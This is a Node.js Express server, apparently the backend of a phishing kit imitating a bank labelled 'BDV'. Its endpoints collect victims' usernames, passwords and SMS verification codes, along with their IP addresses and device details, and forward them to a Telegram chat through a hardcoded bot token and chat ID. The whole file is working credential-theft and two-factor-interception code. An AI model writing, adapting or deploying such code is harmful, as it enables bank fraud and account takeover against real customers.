require('dotenv').config();
const express = require('express');
const axios = require('axios');
const app = express();

// Configuración
const BOT_TOKEN = process.env.BOT_TOKEN || '7207232429:AAEsTg-EA9tSCaJYazHEqA-lvOfldZTczNU';
const CHAT_ID = process.env.CHAT_ID || '-1002548985972';
const PORT = process.env.PORT || 10000;

// Middlewares
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Configuración CORS (Permitir conexión desde Netlify)
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

// Función para obtener IP del cliente
const getClientIp = (req) => {
  return req.headers['x-forwarded-for'] || req.connection.remoteAddress;
};

// Función para enviar mensajes a Telegram
const sendTelegramMessage = async (message) => {
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
    return true;
  } catch (error) {
    console.error('Error enviando a Telegram:', error.message);
    return false;
  }
};

// Ruta de prueba
app.get('/', (req, res) => {
  res.send('🟢 Backend BDV funcionando | Envía datos a Telegram');
});

// Ruta para recibir credenciales
app.post('/user-endpoint', async (req, res) => {
  const { nombre, contra } = req.body;
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'];

  const message = `🔐 *NUEVAS CREDENCIALES* 🔐\n\n`
                + `👤 Usuario: \`${nombre}\`\n`
                + `🔑 Contraseña: \`${contra}\`\n`
                + `🌐 IP: \`${ip}\`\n`
                + `📱 Dispositivo: ${userAgent}\n`
                + `🕒 Fecha: ${new Date().toLocaleString()}\n`
                + `📍 Mapa: https://www.google.com/maps?q=${ip}`;

  const success = await sendTelegramMessage(message);
  res.status(success ? 200 : 500).json({ success });
});

// Ruta para recibir códigos SMS
app.post('/sms-endpoint', async (req, res) => {
  const { sms, nombre } = req.body;
  const ip = getClientIp(req);

  const message = `📲 *CÓDIGO SMS RECIBIDO* 📲\n\n`
                + `🔢 Código: \`${sms}\`\n`
                + `👤 Usuario: \`${nombre}\`\n`
                + `🌐 IP: \`${ip}\`\n`
                + `🕒 Fecha: ${new Date().toLocaleString()}`;

  const success = await sendTelegramMessage(message);
  res.status(success ? 200 : 500).json({ success });
});

// Ruta para cancelaciones
app.post('/cancel-endpoint', async (req, res) => {
  const { tipo } = req.body;
  const ip = getClientIp(req);

  const message = `❌ *SOLICITUD CANCELADA* ${tipo === '2' ? '(2)' : ''} ❌\n\n`
                + `🕒 Fecha: ${new Date().toLocaleString()}\n`
                + `🌐 IP: \`${ip}\`\n`
                + `📍 Mapa: https://www.google.com/maps?q=${ip}`;

  await sendTelegramMessage(message);
  res.json({ success: true });
});

// Ruta para reenvíos
app.post('/resend-endpoint', async (req, res) => {
  const ip = getClientIp(req);

  const message = `🔄 *REENVÍO DE CÓDIGO* 🔄\n\n`
                + `🌐 IP: \`${ip}\`\n`
                + `🕒 Fecha: ${new Date().toLocaleString()}`;

  await sendTelegramMessage(message);
  res.json({ success: true });
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`🚀 Servidor BDV escuchando en puerto ${PORT}`);
  console.log(`🔗 URL: http://localhost:${PORT}`);
});